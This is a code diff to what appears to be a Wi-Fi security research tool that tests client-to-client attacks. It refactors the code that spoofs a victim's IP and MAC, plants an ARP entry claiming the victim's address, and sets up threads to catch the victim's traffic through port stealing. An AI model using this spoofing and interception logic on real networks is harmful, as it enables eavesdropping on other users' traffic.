@@ -910,10 +910,10 @@ class Client2Client:
 	
 	def send_uplink_frame(self):
 		if self.options.c2c_port_steal is not None:
-			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
-			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
-			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 			for _ in range(500):
+				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
+				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
+				log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
 				time.sleep(0.5)
 
@@ -931,16 +931,15 @@ class Client2Client:
 	def start_monitor(self):
 		# Let the 2nd client handle ARP requests and monitor for packets
 		self.sup_victim.set_eth_handler(self.monitor_eth)
-		self.sup_victim.event_loop(timeout=5)
+		self.sup_victim.event_loop()
 
 	def start_attacker_receiver(self):
 		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal)
-		self.sup_attacker.event_loop(timeout=5)
+		self.sup_attacker.event_loop()
 
 	def start_attacker_receiver2(self):
 		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal_uplink)
-		self.sup_attacker.event_loop(timeout=5)
-		self.sup_victim.event_loop(timeout=5)
+		self.sup_attacker.event_loop()
 
 	def run(self):
 		# Start both clients
@@ -992,6 +991,9 @@ class Client2Client:
 		# Let the attacker get an IP address, also
 		if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
 			self.sup_attacker.get_ip_address()
+		elif self.options.c2c_port_steal is not None:
+			self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
+			self.sup_attacker.can_send_traffic = True
 
 
 		if self.options.check_gtk_shared is not None:
@@ -1006,28 +1008,30 @@ class Client2Client:
 
 		thread1 = threading.Thread(target=self.send_c2c_frame)
 		
+		thread2 = threading.Thread(target=self.start_monitor)
+
 		if self.options.c2c_port_steal is not None:
-			thread2 = threading.Thread(target=self.start_attacker_receiver)
+			thread4 = threading.Thread(target=self.start_attacker_receiver)
 		elif self.options.c2c_port_steal_uplink is not None:
-			thread2 = threading.Thread(target=self.start_attacker_receiver2)
-		else:
-			thread2 = threading.Thread(target=self.start_monitor)
+			thread4 = threading.Thread(target=self.start_attacker_receiver2)
+			
 
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None:
 				thread3 = threading.Thread(target=self.send_uplink_frame)
-				thread3.start()
 			elif self.options.c2c_port_steal_uplink is not None:
 				thread3 = threading.Thread(target=self.send_uplink_frame2)
-				thread3.start()
+				
 
 		thread2.start()
 		thread1.start()
-		
+		thread4.start()
+		thread3.start()
 
 
 		thread1.join()
 		thread2.join()
+		thread4.join()
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
 				thread3.join()
